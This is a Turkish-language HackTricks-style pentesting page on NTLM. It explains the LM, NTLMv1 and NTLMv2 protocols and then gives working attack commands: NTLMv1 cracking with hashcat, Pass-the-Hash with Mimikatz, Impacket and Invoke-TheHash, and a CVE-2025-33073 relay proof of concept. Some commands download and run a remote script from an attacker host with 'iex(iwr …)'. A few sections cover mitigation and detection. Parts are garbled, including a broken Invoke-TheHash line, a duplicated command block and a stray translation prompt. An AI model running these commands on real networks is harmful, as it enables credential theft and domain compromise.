# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

**Windows XP ve Server 2003** kullanılan ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinir. `AAD3B435B51404EEAAD3B435B51404EE` özel LM hash'i, LM'nin kullanılmadığı durumu belirtir ve boş bir dizenin hash'idir.

Varsayılan olarak, birincil yöntem **Kerberos** kimlik doğrulama protokolüdür. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, domain'in mevcut olmaması, hatalı yapılandırma nedeniyle Kerberos'un çalışmaması veya geçerli bir hostname yerine IP adresi kullanılarak bağlantı kurulmaya çalışılması.

Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, NTLM kimlik doğrulama sürecine işaret eder.

LM, NTLMv1 ve NTLMv2 kimlik doğrulama protokollerinin desteği, `%windir%\Windows\System32\msv1\_0.dll` konumundaki belirli bir DLL tarafından sağlanır.

**Önemli Noktalar**:

- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) LM'nin kullanılmadığını gösterir.
- Varsayılan kimlik doğrulama yöntemi Kerberos'tur; NTLM yalnızca belirli koşullarda kullanılır.
- NTLM kimlik doğrulama paketleri "NTLMSSP" başlığından tanınabilir.
- LM, NTLMv1 ve NTLMv2 protokolleri `msv1\_0.dll` sistem dosyası tarafından desteklenir.

## LM, NTLMv1 ve NTLMv2

Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ dosyasını çalıştırın -> Yerel İlkeler -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Manager kimlik doğrulama düzeyi. 6 düzey vardır (0'dan 5'e).

![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc dosyasını çalıştırın - Yerel İlkeler - Güvenlik Seçenekleri - Ağ Güvenliği: LAN Manager kimlik doğrulama düzeyi. 6 düzey vardır (0'dan 5'e)](<../../images/image (919).png>)

### Kayıt Defteri

Bu, düzeyi 5 olarak ayarlar:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Olası değerler:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Temel NTLM Domain kimlik doğrulama şeması

1. **Kullanıcı** **kimlik bilgilerini** girer
2. İstemci makine, **domain adını** ve **kullanıcı adını** göndererek bir **kimlik doğrulama isteği gönderir**
3. **Sunucu** **challenge** gönderir
4. **İstemci**, **challenge** değerini anahtar olarak parolanın hash'ini kullanarak **şifreler** ve yanıt olarak gönderir
5. **Sunucu**, **domain adını, kullanıcı adını, challenge değerini ve yanıtı** **Domain controller**'a gönderir. Active Directory yapılandırılmamışsa veya domain adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
6. **Domain controller, her şeyin doğru olup olmadığını kontrol eder** ve bilgileri sunucuya gönderir

**Sunucu** ve **Domain Controller**, Domain Controller sunucunun parolasını bildiğinden (parola **NTDS.DIT** veritabanında bulunur), **Netlogon** sunucusu aracılığıyla bir **Secure Channel** oluşturabilir.

### Yerel NTLM kimlik doğrulama şeması

Kimlik doğrulama, **önce** belirtilenle aynıdır; ancak **sunucu**, **SAM** dosyasında kimlik doğrulamaya çalışan kullanıcının hash'ini bilir. Bu nedenle, Domain Controller'a sormak yerine **sunucu kullanıcının kimlik doğrulaması yapıp yapamayacağını kendisi kontrol eder**.

### NTLMv1 Challenge

**Challenge uzunluğu 8 byte**, **yanıt uzunluğu ise 24 byte**'tır.

**NT hash'i (16 byte)**, her biri 7 byte olan **3 parçaya** bölünür (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla **ayrı ayrı şifrelenir** ve şifrelenmiş **sonuçlar** birleştirilir. Toplam: 8B + 8B + 8B = 24 byte.

**Sorunlar**:

- **Rastgelelik** eksikliği
- NT hash'i bulmak için 3 parça **ayrı ayrı saldırıya uğratılabilir**
- **DES kırılabilir**
- 3. anahtar her zaman **5 sıfırdan** oluşur.
- **Aynı challenge** verildiğinde **yanıt** da **aynı** olur. Böylece kurbana challenge olarak "**1122334455667788**" dizesini verebilir ve kullanılan yanıtı **önceden hesaplanmış rainbow table'lar** ile saldırıya uğratabilirsiniz.

### NTLMv1 saldırısı

Unconstrained delegation modern ortamlarda daha az yaygındır; ancak erişilebilir bir **Print Spooler service**, kimlik doğrulamayı böyle bir host'a zorlamak için hâlâ kötüye kullanılabilir.

AD'de zaten sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak **yazıcıdan kontrolünüz altındaki bir host'a karşı kimlik doğrulaması yapmasını isteyebilirsiniz**. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama challenge değerini 1122334455667788 olarak ayarlayabilir**, kimlik doğrulama girişimini yakalayabilir ve girişim **NTLMv1** kullanılarak yapıldıysa **parolayı kırabilirsiniz**.\
`responder` kullanıyorsanız, kimlik doğrulamayı **downgrade** etmeyi denemek için **`--lm` flag'ini kullanmayı** deneyebilirsiniz.\
_Bu tekniğin çalışması için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerekir (NTLMv2 geçerli değildir)._

Yazıcının kimlik doğrulama sırasında bilgisayar hesabını kullanacağını ve bilgisayar hesaplarının **uzun ve rastgele parolalara** sahip olduğunu; bu parolaları yaygın **sözlükleri** kullanarak **muhtemelen kıramayacağınızı** unutmayın. Ancak **NTLMv1** kimlik doğrulaması **DES** kullanır ([daha fazla bilgi](#ntlmv1-challenge)); bu nedenle DES kırmaya özel olarak ayrılmış bazı hizmetleri kullanarak parolayı kırabilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).

### hashcat ile NTLMv1 saldırısı

NTLMv1, yakalanan NTLMv1 mesajlarını Hashcat'e uygun biçimlere dönüştüren [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) ile de saldırıya uğratılabilir.<sup>[[1]](#references)</sup>

Komut

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

aşağıdakini çıktı olarak verirdi:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Lütfen dosyaya eklenecek içeriği paylaşın.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat'i çalıştırın (aksi takdirde bu işlem birkaç gün süreceğinden, hashtopolis gibi bir araç kullanarak dağıtık şekilde çalıştırmak en iyisidir).

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Bu durumda parolasının password olduğunu biliyoruz, bu yüzden demo amacıyla hile yapacağız:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Artık crack edilmiş DES anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities'i kullanmamız gerekiyor:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Son olarak son bölüm:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Bunları birleştirin:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Challenge uzunluğu 8 byte'tır** ve **2 response gönderilir**: Biri **24 byte** uzunluğundadır, **diğerinin** uzunluğu ise **değişkendir**.

**İlk response**, **client ve domain** bileşenlerinden oluşan **string**'in **key** olarak **NT hash'in MD4 hash'i** kullanılarak **HMAC_MD5** ile şifrelenmesiyle oluşturulur. Ardından **sonuç**, **challenge**'ı **HMAC_MD5** ile şifrelemek için **key** olarak kullanılır. Buna **8 byte'lık bir client challenge** eklenir. Toplam: 24 B.

**İkinci response**, **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay saldırılarını** önlemek için bir **timestamp**...)

**Başarılı bir authentication exchange içeren bir PCAP** dosyanız varsa domain, username, server challenge ve NTLMv2 response'u çıkarın, capture'ı Hashcat için biçimlendirin ve parola kurtarmayı denemek için `5600` modunu kullanın. Arşivlenmiş uygulamalı walkthrough, paket alanlarını çıkarma prosedürünü korurken Hashcat'in örnekleri şu anda kabul edilen biçimi tanımlar.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Kurbanın hash'ine sahip olduğunuzda**, onu **taklit etmek** için kullanabilirsiniz.\
Bu **hash'i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde** bu **hash kullanılır.** Mimikatz'in yaptığı son seçenektir.

**Pass-the-Hash saldırılarını Computer hesaplarını kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Administrator olarak çalıştırılmalıdır**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

This, LSASS sağlanan kimlik bilgilerini giden ağ oturum açma işlemiyle ilişkilendirirken, mevcut yerel kullanıcı altında bir işlem başlatır. Ardından, düz metin parolayı bilmeden, `runas /netonly` komutuna benzer şekilde sağlanan kullanıcı olarak ağ kaynaklarına erişebilirsiniz.

### Linux'tan Pass-the-Hash

Linux'tan Pass-the-Hash kullanarak Windows makinelerinde kod çalıştırabilirsiniz.\
[**Uygulamalı Pass-the-Hash çalıştırma örneklerine bakın.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket'ın derlenmiş Windows araçları

[Impacket Windows ikililerini buradan indirebilirsiniz](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir komut belirtmeniz gerekir; etkileşimli bir shell elde etmek için cmd.exe ve powershell.exe geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Başka birçok Impacket ikilisi var...

### Invoke-TheHash

Powershell scriptlerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Bu işlev, önceki modları bir araya getirir. **Birden fazla host** belirtebilir, seçili hedefleri hariç tutabilir ve _SMBExec, WMIExec, SMBClient_ veya _SMBEnum_ seçeneklerinden birini tercih edebilirsiniz. _**Command**_ parametresi olmadan **SMBExec** veya **WMIExec** seçerseniz, yalnızca yeterli izniniz olup olmadığını kontrol eder.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılmalıdır**

Bu araç, mimikatz ile aynı şeyi yapar (LSASS belleğini değiştirir).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Kullanıcı adı ve parola ile Windows'ta manuel uzaktan çalıştırma


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host'tan kimlik bilgilerini çıkarma

Daha fazla bilgi için [**Windows Kimlik Bilgilerini Çalma**](../stealing-credentials/README.md) bölümüne bakın.

## Internal Monologue attack

Internal Monologue Attack, saldırganın **LSASS süreciyle doğrudan etkileşime girmeden** kurbanın makinesinden NTLM hash'lerini almasını sağlayan gizli bir kimlik bilgisi çıkarma tekniğidir. Hash'leri doğrudan bellekten okuyan ve uç nokta güvenlik çözümleri veya Credential Guard tarafından sık sık engellenen Mimikatz'ın aksine, bu attack **Security Support Provider Interface (SSPI) aracılığıyla NTLM kimlik doğrulama paketine (MSV1_0) yapılan yerel çağrılardan** yararlanır. Saldırgan önce NetNTLMv1'e izin verildiğinden emin olmak için **NTLM ayarlarını düşürür** (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic). Ardından çalışan süreçlerden elde ettiği mevcut kullanıcı token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 yanıtları oluşturmak için yerel olarak NTLM kimlik doğrulamasını tetikler.<sup>[[4]](#references)</sup>

Bu NetNTLMv1 yanıtlarını yakaladıktan sonra saldırgan, **önceden hesaplanmış rainbow table'ları** kullanarak orijinal NTLM hash'lerini hızla kurtarabilir ve yanal hareket için Pass-the-Hash attack'lerine devam edebilir. Önemli olarak, Internal Monologue Attack gizli kalır; çünkü ağ trafiği oluşturmaz, kod enjekte etmez veya doğrudan bellek dökümü tetiklemez. Bu da savunmacıların saldırıyı Mimikatz gibi geleneksel yöntemlere kıyasla tespit etmesini zorlaştırır.

Zorunlu güvenlik ilkeleri nedeniyle NetNTLMv1 kabul edilmezse saldırgan NetNTLMv1 yanıtı alamayabilir.

Bu durumu ele almak için Internal Monologue aracı güncellendi: NetNTLMv1 başarısız olursa **NetNTLMv2 yanıtlarını yakalamaya** devam edebilmek için `AcceptSecurityContext()` kullanarak dinamik biçimde bir sunucu token'ı edinir. NetNTLMv2'yi kırmak çok daha zor olsa da sınırlı durumlarda relay attack'lerine veya çevrimdışı brute-force'a kapı aralayabilir.

PoC'ye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** adresinden ulaşabilirsiniz.<sup>[[4]](#references)</sup>

## NTLM Relay ve Responder

**Bu attack'lerin nasıl gerçekleştirileceğine ilişkin daha ayrıntılı kılavuzu burada okuyun:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Ağ yakalamasından NTLM challenge'larını ayrıştırma

**Şunu kullanabilirsiniz:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serileştirilmiş SPN'ler aracılığıyla NTLM ve Kerberos *Reflection* (CVE-2025-33073)

Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) kimlik doğrulamasının SYSTEM ayrıcalıkları elde etmek için **aynı** host'a geri relay edildiği *reflection* attack'lerini önlemeye çalışan çeşitli azaltımlara sahiptir.  

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki yamalarla halka açık zincirlerin çoğunu bozdu; ancak **CVE-2025-33073**, *marshalled* (serileştirilmiş) target-info içeren Service Principal Name'lerin (SPN'lerin) **SMB client tarafından nasıl kısaltıldığından** yararlanılarak korumaların hâlâ aşılabileceğini gösteriyor.<sup>[[5]](#references)[[6]](#references)</sup>

### Hatanın özeti
1. Saldırgan, etiketi marshalled bir SPN kodlayan bir **DNS A-record** kaydeder; ör.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Kurbanın bu hostname'e kimlik doğrulaması yapması sağlanır (PetitPotam, DFSCoerce vb.).
3. SMB client, `cifs/srv11UWhRCAAAAA…` hedef dizesini `lsasrv!LsapCheckMarshalledTargetInfo` işlevine ilettiğinde `CredUnmarshalTargetInfo` çağrısı serileştirilmiş blob'u **atar** ve geriye **`cifs/srv1`** kalır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos'taki eşdeğeri), kısa host bölümü bilgisayar adıyla (`SRV1`) eşleştiği için hedefi artık *localhost* olarak kabul eder.
5. Bunun sonucunda sunucu `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini ayarlar ve bağlama **LSASS'in SYSTEM access-token'ını** enjekte eder (Kerberos için SYSTEM işaretli bir subsession key oluşturulur).
6. Bu kimlik doğrulamayı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host'ta tam SYSTEM yetkileri sağlar.<sup>[[5]](#references)</sup>

### Hızlı PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Yama ve Azaltımlar
* **CVE-2025-33073** için KB yaması, `mrxsmb.sys::SmbCeCreateSrvCall` içine `CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER` olduğunda marshalled info içeren herhangi bir SMB bağlantısını engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay hedeflerinde **SMB signing** uygulayın. Diğer hedefler için ilgili protokolün kendi signing veya Extended Protection gereksinimlerini ve yama düzeyini değerlendirin; yalnızca SMB signing, HTTPS WinRM relay'in mümkün olup olmadığını belirlemez.
* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve zorlama vektörlerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Tespit fikirleri
* İstemci IP'sinin sunucu IP'sine eşit olmadığı `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren ağ yakalamaları.
* Bir subsession key içeren ve istemci principal'ı ana bilgisayar adına eşit olan Kerberos AP-REQ.
* Aynı ana bilgisayardan gelen uzak SMB yazmalarının hemen öncesinde görülen Windows Event 4624/4648 SYSTEM oturum açma olayları.<sup>[[5]](#references)</sup>

Serileştirilmiş bir target-information DNS adı, zorlanmış kimlik doğrulamasını AD CS web-enrollment uç noktasına yönelik **protokoller arası relay** için bir saldırgana yönlendirebilir. Bu, aynı ana makinedeki reflection'dan farklı bir sonuçtur: [ESC8 kayıt koşulları](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS yazma hakları, zorlama yolu ve hedefin yama düzeyi birbirinden bağımsız olarak değerlendirilmelidir.

**NT AUTHORITY\SYSTEM** erişimi elde etmek için **SMB rastgele portlarını** ve **TCP bağlantı yeniden kullanımını** kötüye kullanan **Mart 2026** yerel reflection çeşidi için bkz.:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Çok Amaçlı Araç](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat örnek hash'leri – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash yardımcı programları](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection Öldü, Yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash'ini Kırma – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
